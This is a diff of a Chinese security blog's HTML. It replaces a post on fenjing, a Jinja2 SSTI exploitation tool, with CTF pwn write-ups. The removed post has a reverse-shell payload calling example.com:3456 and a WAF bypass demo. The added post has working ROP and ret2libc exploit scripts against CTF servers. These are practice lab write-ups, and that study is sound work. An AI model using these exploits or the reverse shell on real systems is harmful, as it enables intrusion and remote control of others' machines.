@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://yixinbc.tech/2023/05/11/fenjing/"/>
+  <link rel="canonical" href="https://yixinbc.tech/2023/07/13/暑期第一周刷题/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog</title>
+  <title>暑期第一周刷题 - yixinBC's blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="yixinBC的个人博客 - yixinBC - yixinBC's blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="fenjing(焚靖)——jinja2 SSTI一把梭">
-<meta property="og:url" content="https://yixinbc.tech/2023/05/11/fenjing/index.html">
+<meta property="og:title" content="暑期第一周刷题">
+<meta property="og:url" content="https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/index.html">
 <meta property="og:site_name" content="yixinBC&#39;s blog">
-<meta property="og:description" content="焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能  安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &amp;#x27;http:&#x2F;&#x2F;xxx&#x2F;&amp;#x27;  也可下载并运行docker镜像12docker pull marven11&#x2F;fenjingdocker run --net host -it">
+<meta property="og:description" content="get_started_3dsctf_2016一开始以为是ret2text板子题（那么大个get_flag函数）。照板子写，打远程，没回显，报错。检查发现函数的返回方式不是leave retn而是retn，遂将fake_ebp的padding去除。没打通。翻网上的题解，发现有师傅提到这题的远程只有程序能正常退出的时候才有回显（确实是老题了，这几年的新题不会这么离谱😅）。遂将get_flag函数的">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-05-11T18:36:24.000Z">
-<meta property="article:modified_time" content="2023-07-13T12:20:11.760Z">
+<meta property="article:published_time" content="2023-07-13T20:14:37.000Z">
+<meta property="article:modified_time" content="2023-07-13T12:20:11.764Z">
 <meta property="article:author" content="yixinBC">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2339,7 +2339,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://yixinbc.tech/2023/05/11/fenjing/">
+  <link itemprop="mainEntityOfPage" href="https://yixinbc.tech/2023/07/13/暑期第一周刷题/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="yixinBC's blog">
   </span>
@@ -2360,7 +2360,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        fenjing(焚靖)——jinja2 SSTI一把梭
+        暑期第一周刷题
       </h1>
       <div class='new-meta-box'>
         
@@ -2381,10 +2381,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-05-11T18:36:24+00:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-07-13T20:14:37+00:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2023年5月11日</p>
+    <p>发布于：2023年7月13日</p>
   </a>
 </div>
 
@@ -2407,42 +2407,55 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <blockquote>
-<p>焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能</p>
-</blockquote>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="使用pip（最省事）"><a href="#使用pip（最省事）" class="headerlink" title="使用pip（最省事）"></a>使用pip（最省事）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install fenjing</span><br><span class="line">python -m fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
+    <h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>一开始以为是ret2text板子题（那么大个<code>get_flag</code>函数）。照板子写，打远程，没回显，报错。检查发现函数的返回方式不是<code>leave retn</code>而是<code>retn</code>，遂将fake_ebp的padding去除。没打通。翻网上的题解，发现有师傅提到这题的远程只有程序能正常退出的时候才有回显（确实是老题了，这几年的新题不会这么离谱😅）。遂将<code>get_flag</code>函数的返回地址设置为<code>elf.sym[&quot;exit&quot;]</code>。<code>get_flag</code>函数开头有一个if判断：</p>
+<p><img src="2023-07-06-23-06-37-image.png" class="lazyload" data-srcset="2023-07-06-23-06-37-image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a"></p>
+<p>原始思路是直接ret2text的时候越过if判断，注意到汇编中此函数在<code>retn</code>前有<code>pop esi</code>，函数开头有<code>push esi</code>，想法是把栈构造成下面这样:</p>
+<table>
+<thead>
+<tr>
+<th>stack_overflow_padding  0x38</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ret2txet_addr(after elf.sym[“get_flag”])</td>
+</tr>
+<tr>
+<td>fake_pop_esi</td>
+</tr>
+<tr>
+<td>elf.sym[“exit”]</td>
+</tr>
+</tbody></table>
+<p>不知为何打不通。老老实实过if判断：</p>
+<table>
+<thead>
+<tr>
+<th>stack_overflow_padding  0x38</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>elf.sym[“get_flag”]</td>
+</tr>
+<tr>
+<td>elf.sym[“exit”]</td>
+</tr>
+<tr>
+<td>get_flag arg1 0x308CD64F</td>
+</tr>
+<tr>
+<td>get_flag arg2 0x195719D1</td>
+</tr>
+</tbody></table>
+<p>最后exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27999</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span></span><br><span class="line">    + p32(elf.sym[<span class="string">&quot;get_flag&quot;</span>])</span><br><span class="line">    + p32(elf.sym[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line">    + p32(<span class="number">0x308CD64F</span>)</span><br><span class="line">    + p32(<span class="number">0x195719D1</span>)</span><br><span class="line">)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="也可下载并运行docker镜像"><a href="#也可下载并运行docker镜像" class="headerlink" title="也可下载并运行docker镜像"></a>也可下载并运行docker镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull marven11/fenjing</span><br><span class="line">docker run --net host -it marven11/fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>32位ret2libc，<code>write</code>泄露，这题因为<code>send</code>和<code>sendline</code>的原因卡了好久，下次写脚本准备先无脑上<code>sendline</code>了</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26926</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Correct\n&quot;</span>)</span><br><span class="line">p.sendline(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * (<span class="number">0xE7</span> + <span class="number">4</span>)</span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">    + p32(<span class="number">0x08048825</span>)  <span class="comment"># main</span></span><br><span class="line">    + p32(<span class="number">1</span>)</span><br><span class="line">    + p32(elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">    + p32(<span class="number">4</span>)</span><br><span class="line">)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">p.sendline(<span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Correct\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span> * (<span class="number">0xE7</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0xDEADBEEF</span>) + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="还可以直接下载源码"><a href="#还可以直接下载源码" class="headerlink" title="还可以直接下载源码"></a>还可以直接下载源码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Marven11/Fenjing</span><br><span class="line">cd Fenjing</span><br></pre></td></tr></table></figure>
-
-<p>下载后可以选择直接使用（先确保用pip安装完依赖）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<p>也可以手动构建一个docker镜像</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t fenjing .</span><br><span class="line">docker run -it --net host fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  crack  攻击指定的表单</span><br><span class="line">  scan   扫描指定的网站</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing crack --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing crack [OPTIONS]</span><br><span class="line"></span><br><span class="line">  攻击指定的表单</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       form所在的URL</span><br><span class="line">  -a, --action TEXT    form的action，默认为当前路径</span><br><span class="line">  -m, --method TEXT    form的提交方式，默认为POST</span><br><span class="line">  -i, --inputs TEXT    form的参数，以逗号分隔</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing scan --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing scan [OPTIONS]</span><br><span class="line"></span><br><span class="line">  扫描指定的网站</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       需要扫描的URL</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br></pre></td></tr></table></figure>
-
-<p>也可做为一个python模块集成进脚本中使用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">payload, _ = exec_cmd_payload(waf, <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-<h2 id="支持的绕过"><a href="#支持的绕过" class="headerlink" title="支持的绕过"></a>支持的绕过</h2><ul>
-<li><code>&#39;</code>和<code>&quot;</code>的绕过</li>
-<li>绝大部分关键字的绕过</li>
-<li>自然数的绕过</li>
-<li>下划线<code>_</code></li>
-<li><code>+</code>和<code>-</code></li>
-<li><code>~</code></li>
-<li><code>[</code>下标访问的绕过</li>
-<li><code>&#123;&#123;&#125;&#125;</code>标签的绕过</li>
-</ul>
-<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3745">[GDOUCTF 2023]&lt;ez_ze&gt;</a><br>打开题目发现是一个使用POST提交表单的网页，检查响应头的<code>Sever</code>字段，发现是<code>Werkzeug/2.2.3 Python/3.8.16</code>，所以应该是一个flask程序，考虑SSTI。<br>使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。<br>尝试焚靖一把梭：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name</span></span><br><span class="line">    ____             _ _</span><br><span class="line">   / __/__  ____    (_|_)___  ____ _</span><br><span class="line">  / /_/ _ \/ __ \  / / / __ \/ __ `/</span><br><span class="line"> / __/  __/ / / / / / / / / / /_/ /</span><br><span class="line">/_/  \___/_/ /_/_/ /_/_/ /_/\__, /</span><br><span class="line">              /___/        /____/</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">INFO:[cli] | Use Ctrl+D to exit.</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&gt;&gt; <span class="built_in">cat</span> /flag</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Hello, $ NSSCTF&#123;82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17&#125;</span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">!</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可见焚靖的WAF绕过能力还是非常强大的</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">Marven11&#x2F;Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker</a>（官方GitHub页面）</p>
-<h2 id="想找一个通用的SSTI-payload生成器？"><a href="#想找一个通用的SSTI-payload生成器？" class="headerlink" title="想找一个通用的SSTI payload生成器？"></a>想找一个通用的SSTI payload生成器？</h2><p>可以去尝试一下<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a></p>
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>64位rop板子题。注意程序里有<code>/bin/sh</code>字符串，可以在ida的strings页面找到。远程flag的位置很怪啊，学习了一下<code>find</code>命令。不知道为什么远程交互的时候过没几秒没操作就会eof</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyrop&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26515</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line">p.sendlineafter(</span><br><span class="line">    <span class="string">b&quot;What&#x27;s your name? &quot;</span>,</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">    + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span></span><br><span class="line">    + p64(pop_rdi)</span><br><span class="line">    + p64(elf.sym[<span class="string">&quot;binsh&quot;</span>])</span><br><span class="line">    + p64(elf.plt[<span class="string">&quot;system&quot;</span>]),</span><br><span class="line">)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
   </div>
   
@@ -2489,7 +2502,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/&title=暑期第一周刷题 - yixinBC's blog&summary="
           
           >
           
@@ -2501,7 +2514,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/&title=暑期第一周刷题 - yixinBC's blog&summary="
           
           >
           
@@ -2513,7 +2526,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/&title=暑期第一周刷题 - yixinBC's blog&summary="
           
           >
           
@@ -2546,16 +2559,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='../../../06/20/SCTF2023/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>SCTF2023 MISC 部分Writeup</p>
+      
+        <a class='next' href='../../../06/20/SCTF2023/'>
+          <p class='title'>SCTF2023 MISC 部分Writeup<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>checkin010修改一下压缩包，把第一个经过压缩算法的flag&#x2F;改为flag（record和dirEntry里的都要改）。改完直接用Windows资源管理器开会报错（大概是修得不完...</p>
-        </a>
-      
-      
-        <a class='next' href='../../../04/21/hello-world/'>
-          <p class='title'>Hexo + volantis配置<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>移步GitHub 仓库查看配置文件源码。
-</p>
         </a>
       
     </div>
@@ -2613,7 +2620,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pip%EF%BC%88%E6%9C%80%E7%9C%81%E4%BA%8B%EF%BC%89"><span class="toc-text">使用pip（最省事）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%B8%8B%E8%BD%BD%E5%B9%B6%E8%BF%90%E8%A1%8Cdocker%E9%95%9C%E5%83%8F"><span class="toc-text">也可下载并运行docker镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-text">还可以直接下载源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">支持的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-text">使用示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%B3%E6%89%BE%E4%B8%80%E4%B8%AA%E9%80%9A%E7%94%A8%E7%9A%84SSTI-payload%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%9F"><span class="toc-text">想找一个通用的SSTI payload生成器？</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-text">[OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop"><span class="toc-text">[HarekazeCTF2019]baby_rop</span></a></li></ol>
     </div>
   </section>
 
@@ -3197,7 +3204,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
